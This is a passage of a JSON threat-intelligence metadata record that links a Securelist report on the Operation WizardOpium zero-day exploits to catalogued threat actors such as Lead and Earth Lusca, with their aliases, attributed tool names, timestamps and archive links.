        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2020/2020.05.28_Operation_WizardOpium/The%20zero-day%20exploits%20of%20Operation%20WizardOpium%20_%20Securelist.pdf"
    ],
    "report_names": [
        "The zero-day exploits of Operation WizardOpium _ Securelist"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "2008a79d-2f3a-475f-abef-3bc119a1bf38",
            "created_at": "2022-10-25T16:07:24.028651Z",
            "updated_at": "2025-03-27T02:02:10.084983Z",
            "deleted_at": null,
            "main_name": "Operation WizardOpium",
            "aliases": [],
            "source_name": "ETDA:Operation WizardOpium",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "5cd3fcb0-eb56-49ac-8125-47ebee93311d",
            "created_at": "2023-01-06T13:46:39.065814Z",
            "updated_at": "2025-03-27T02:00:02.988828Z",
            "deleted_at": null,
            "main_name": "Operation WizardOpium",
            "aliases": [],
            "source_name": "MISPGALAXY:Operation WizardOpium",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "9f101d9c-05ea-48b9-b6f1-168cd6d06d12",
            "created_at": "2023-01-06T13:46:39.396409Z",
            "updated_at": "2025-03-27T02:00:03.074969Z",
            "deleted_at": null,
            "main_name": "Earth Lusca",
            "aliases": [
                "CHROMIUM",
                "ControlX",
                "Red Dev 10",
                "RedHotel",
                "Red Scylla",
                "TAG-22",
                "BRONZE UNIVERSITY",
                "AQUATIC PANDA",
                "Charcoal Typhoon",
                "BountyGlad"
            ],
            "source_name": "MISPGALAXY:Earth Lusca",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "6abcc917-035c-4e9b-a53f-eaee636749c3",
            "created_at": "2022-10-25T16:07:23.565337Z",
            "updated_at": "2025-03-27T02:02:09.868522Z",
            "deleted_at": null,
            "main_name": "Earth Lusca",
            "aliases": [
                "Bronze University",
                "Charcoal Typhoon",
                "Chromium",
                "Red Dev 10",
                "Red Scylla"
            ],
            "source_name": "ETDA:Earth Lusca",
            "tools": [
                "Agentemis",
                "AntSword",
                "BIOPASS",
                "BIOPASS RAT",
                "BadPotato",
                "Behinder",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "Doraemon",
                "FRP",
                "Fast Reverse Proxy",
                "FunnySwitch",
                "HUC Port Banner Scanner",
                "KTLVdoor",
                "Mimikatz",
                "NBTscan",
                "POISONPLUG.SHADOW",
                "PipeMon",
                "RbDoor",
                "RibDoor",
                "RouterGod",
                "SAMRID",
                "ShadowPad Winnti",
                "SprySOCKS",
                "WinRAR",
                "Winnti",
                "XShellGhost",
                "cobeacon",
                "fscan",
                "lcx",
                "nbtscan"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d53593c3-2819-4af3-bf16-0c39edc64920",
            "created_at": "2022-10-27T08:27:13.212301Z",
            "updated_at": "2025-03-27T02:00:55.529662Z",
            "deleted_at": null,
            "main_name": "Earth Lusca",
            "aliases": [
                "Earth Lusca",
                "TAG-22",
                "Charcoal Typhoon",
                "CHROMIUM",
                "ControlX"
            ],
            "source_name": "MITRE:Earth Lusca",
            "tools": [
                "Mimikatz",
                "PowerSploit",
                "Tasklist",
                "certutil",
                "Cobalt Strike",
                "Winnti for Linux",
                "Nltest",
                "NBTscan",
                "ShadowPad"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1666716504,
    "ts_updated_at": 1743041735,
    "ts_creation_date": 1590720191,
    "ts_modification_date": 1590720191,
    "files": {
        "pdf": "https://archive.orkl.eu/e76e32e631c965b225e1e3eae6ba3d480a01d3a7.pdf",
        "text": "https://archive.orkl.eu/e76e32e631c965b225e1e3eae6ba3d480a01d3a7.txt",
        "img": "https://archive.orkl.eu/e76e32e631c965b225e1e3eae6ba3d480a01d3a7.jpg"
    }
}